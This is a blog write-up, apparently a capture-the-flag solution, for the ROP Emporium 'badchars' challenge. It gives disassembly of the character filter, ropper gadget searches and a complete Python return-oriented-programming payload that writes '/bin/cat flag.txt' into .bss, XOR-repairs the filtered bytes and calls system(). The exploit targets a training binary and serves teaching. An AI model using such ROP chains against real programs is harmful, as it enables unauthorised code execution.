@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>05_badchars</title><!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="05_badchars" />
+<meta name="author" content="silma" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="ROP Emporium badchars" />
+<meta property="og:description" content="ROP Emporium badchars" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-20T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"05_badchars","dateModified":"2020-04-20T00:00:00+02:00","datePublished":"2020-04-20T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/series/rop_emporium/ropemporium-badchars/"},"url":"/series/rop_emporium/ropemporium-badchars/","author":{"@type":"Person","name":"silma"},"description":"ROP Emporium badchars","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/</a></li><li><a href="/writeups.html">writeups</a></li><li><a href="/series.html">series</a></li><li><a href="/cheatsheets.html">cheatsheets</a></li><li><a href="/about.html">about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="rop-emporium-badchars">ROP Emporium badchars</h1>
+<p><br /></p>
+
+<p><strong>Tools:</strong> IDA Free 7.0, gdb-gef, ropper, readelf
+<strong>Prerequistes:</strong> Stack frame
+<strong>Download solution:</strong> <a href="/assets/series/rop_emporium/main.py">main.py</a></p>
+
+<h2 id="overview">Overview</h2>
+
+<blockquote>
+  <p>“An arbitrary write challenge with a twist; certain input characters get mangled before finding their way onto the stack. […]”</p>
+</blockquote>
+
+<p>In this challenge, a function checks our input and if it contains some “special” characters, they are replaced by the byte “<em>\xEB</em>”. Otherwise, it is similar to the challenge <a href="/series/rop_emporium/ropemporium-write4/">write4</a>.</p>
+
+<h2 id="function-pwnme">Function <em>pwnme()</em></h2>
+
+<p><em>_fgets()</em> takes an input of up to 0x200 bytes and stores it on the heap. Then, the length of this input is computed by the function <em>nstrlen()</em>: it stops when the character “<em>\x0A</em>” is found:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0000000000400A0E</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">user_input</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400A12</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400A16</span>    <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>
+<span class="err">0</span><span class="nf">x0000000000400A19</span>    <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400A1C</span>    <span class="nv">cmp</span>     <span class="nb">al</span><span class="p">,</span> <span class="mh">0Ah</span>       <span class="c1">; line feed</span>
+<span class="err">0</span><span class="nf">x0000000000400A1E</span>    <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">next_char</span>
+<span class="err">0</span><span class="nf">x0000000000400A20</span>    <span class="nv">add</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">],</span> <span class="mi">1</span>    <span class="c1">; +1</span>
+<span class="err">0</span><span class="nf">x0000000000400A25</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400A29</span>    <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">exit</span>
+</code></pre></div></div>
+<p>The length is returned in <em>rax</em> and used by the function <em>checkBadchars()</em> to check user input. Forbidden chars are replaced by “<em>\xEB</em>”:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0000000000400A90</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">user_input</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400A94</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>  <span class="c1">; length input</span>
+<span class="err">0</span><span class="nf">x0000000000400A98</span>    <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>
+<span class="err">0</span><span class="nf">x0000000000400A9B</span>    <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400A9E</span>    <span class="nv">lea</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">badchars_array</span><span class="p">]</span> <span class="c1">; &lt;space&gt;bcfins/</span>
+<span class="err">0</span><span class="nf">x0000000000400AA2</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">j</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400AA6</span>    <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>
+<span class="err">0</span><span class="nf">x0000000000400AA9</span>    <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400AAC</span>    <span class="nv">cmp</span>     <span class="nb">dl</span><span class="p">,</span> <span class="nb">al</span>    <span class="c1">; cmp input[i], badchars[j]</span>
+<span class="err">0</span><span class="nf">x0000000000400AAE</span>    <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">ok</span>
+<span class="err">0</span><span class="nf">x0000000000400AB0</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">user_input</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400AB4</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400AB8</span>    <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>
+<span class="err">0</span><span class="nf">x0000000000400ABB</span>    <span class="nv">mov</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">0EBh</span> <span class="c1">; patch</span>
+<span class="err">0</span><span class="nf">x0000000000400ABE</span>    <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">inc_counter</span>
+</code></pre></div></div>
+<p>Once filtered, the user input is copied to the stack:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00000000004009B5</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">str_length</span><span class="p">]</span> <span class="c1">; input length</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00000000004009C5</span>    <span class="nv">mov</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; src: filtered input</span>
+<span class="err">0</span><span class="nf">x00000000004009C8</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rcx</span>        <span class="c1">; dest</span>
+<span class="err">0</span><span class="nf">x00000000004009CB</span>    <span class="nv">call</span>    <span class="nv">_memcpy</span>
+</code></pre></div></div>
+
+<h2 id="arbitraty-write">Arbitraty write</h2>
+
+<p>As usual, <em>usefulFunction()</em> implements a <em>call to _system()</em> with <em>edi</em> pointing to “<em>/bin/ls</em>”. The string “<em>/bin/cat flag.txt</em>” is absent so we’ll have to find an arbitrary write. 
+The section <em>.bss</em> still seems to be a good place to write the string “<em>/bin/cat flag.txt</em>”:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf <span class="nt">--sections</span> ../challs/badchars
+There are 31 section headers, starting at offset 0x1d08:
+
+Section Headers:
+<span class="o">[</span>Nr] Name              Type             Address           Offset
+     Size              EntSize          Flags  Link  Info  Align
+<span class="o">[</span>...]
+<span class="o">[</span>26] .bss              NOBITS           0000000000601080  00001080
+       0000000000000030  0000000000000000  WA       0     0     32
+<span class="o">[</span>...]
+</code></pre></div></div>
+<p>We find 2 write gadgets:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"mov [%]"</span>  <span class="nt">-f</span> ../challs/badchars
+<span class="o">[</span>...]
+<span class="o">[</span>INFO] File: ../challs/badchars
+0x0000000000400b35: mov dword ptr <span class="o">[</span>rbp], esp<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b34: mov qword ptr <span class="o">[</span>r13], r12<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+<p>Focusing on the <em>r13</em> / <em>r12</em> pair:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"??? r1?"</span> <span class="nt">-f</span> ../challs/badchars
+<span class="o">[</span>...]
+0x0000000000400bac: pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b3b: pop r12<span class="p">;</span> pop r13<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400bae: pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b3d: pop r13<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b40: pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b42: pop r15<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+<p>In addition, if our input contains forbidden chars they will be replaced by “<em>\xEB</em>”. 
+Whether we encode the user input before or let the function <em>checkBadchars()</em> replace the badchars, we’ll need a gadget to fix things afterwards. In both cases a good old <em>xor</em> can do the trick:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"xor ???"</span> <span class="nt">-f</span> ../challs/badchars
+<span class="o">[</span>...]
+0x0000000000400b30: xor byte ptr <span class="o">[</span>r15], r14b<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b31: xor byte ptr <span class="o">[</span>rdi], dh<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+<p>And from the before last ropper output, we know we can control <em>r14</em> and <em>r15</em>.
+Last gadget we need is a write into <em>rdi</em>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"??? rdi"</span> <span class="nt">-f</span> ../challs/badchars
+<span class="o">[</span>...]
+0x00000000004009d4: mov rdi, rax<span class="p">;</span> call 0x6d0<span class="p">;</span> nop<span class="p">;</span> leave<span class="p">;</span> ret<span class="p">;</span> 
+0x0000000000400b39: pop rdi<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+
+<h2 id="building-the-chain">Building the chain</h2>
+
+<p>I opted for an non-encoded payload and just xoring the <em>\xEB</em> bytes to retrieve the correct “<em>/bin/cat flag.txt</em>” string. For example, let’s say we want “<em>\x62</em>” to be the final result written somewhere: <em>0x62 ^ 0xEB = 0x89</em>.
+The payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x42\x42\x42\x42\x42\x42\x42\x42</span><span class="s">'</span>  <span class="c1"># fill buffer (overwrite RSP)
+</span>
+<span class="c1"># Write to .bss
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x3b\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12, pop r13, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x62\x69\x6e\x2f\x63\x61\x74</span><span class="s">'</span>  <span class="c1"># r12 = "/bin/cat"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x80\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r13 -&gt; .bss
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x34\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov [r13], r12
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x3b\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12, pop r13, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x20\x66\x6c\x61\x67\x2e\x74\x78</span><span class="s">'</span> <span class="c1"># r12 = " flag.tx"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x88\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r13 -&gt; .bss+8
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x34\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov [r13], r12
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x3b\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12, pop r13, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x74\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r12 = "t\x00"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r13 -&gt; .bss+0x10
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x34\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov [r13], r12
+</span>
+<span class="c1"># Fix the \xEB bytes
+# --- 0xc4 ^ 0xeb = 0x2f ("/")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xc4\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0xc4 (xorkey n°1)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x80\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss (found badchar n°1)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0x89 ^ 0xeb = 0x62 ("b")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x89\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0x89 (xorkey n°2)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x81\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+1 (found badchar n°2)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0x82 ^ 0xeb = 0x69 ("i")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x82\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0x82 (xorkey n°3)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x82\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+2 (found badchar n°3)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0x85 ^ 0xeb = 0x6e ("n")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x85\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0x85 (xorkey n°4)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x83\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+3 (found badchar n°4)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0xc4 ^ 0xeb = 0x2f ("/")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xc4\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0xc4 (xorkey n°5)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x84\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+4 (found badchar n°5)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0x88 ^ 0xeb = 0x63 ("c")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x88\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0x88 (xorkey n°6)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x85\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+5 (found badchar n°6)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0xcb ^ 0xeb = 0x20 (" ")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xcb\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0xcb (xorkey n°7)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x88\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+8 (found badchar n°7)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+# --- 0x8d ^ 0xeb = 0x66 (f")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r14, pop r15, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x8d\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r14 = 0x8d (xorkey n°8)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x89\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># r15 -&gt; .bss+9 (found badchar n°8)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor [r15], r14b, ret
+</span>
+<span class="c1"># Get flag
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x39\x0b\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop rdi, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x80\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># -&gt;"/bin/cat flag.txt"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe8\x09\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># call _system()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x43\x43\x43\x43\x43\x43\x43\x43</span><span class="s">'</span>  <span class="c1"># dummy (stack alignment)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xb9\x07\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># hlt
+</span></code></pre></div></div>
+
+<hr />
+<p>end of file</p>
+
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
